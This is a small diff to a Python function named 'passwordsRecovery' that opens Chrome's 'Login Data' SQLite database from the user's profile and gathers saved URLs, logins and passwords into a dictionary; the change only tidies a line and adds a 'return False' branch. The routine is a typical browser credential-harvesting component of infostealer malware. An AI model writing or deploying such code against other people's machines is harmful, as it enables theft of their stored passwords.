@@ -10,7 +10,7 @@ def passwordsRecovery():
     #|
     i = 0
     passwords  = {}
-    db_path    = (os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data')
+    db_path    = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'
     if os.path.exists(db_path):    
         conn   = sqlite3.connect(db_path)
         cursor = conn.cursor()
@@ -23,3 +23,5 @@ def passwordsRecovery():
                 i += 1
                 passwords[i] = {'url': url, 'login': login, 'password': password}
         return passwords
+    else:
+        return False
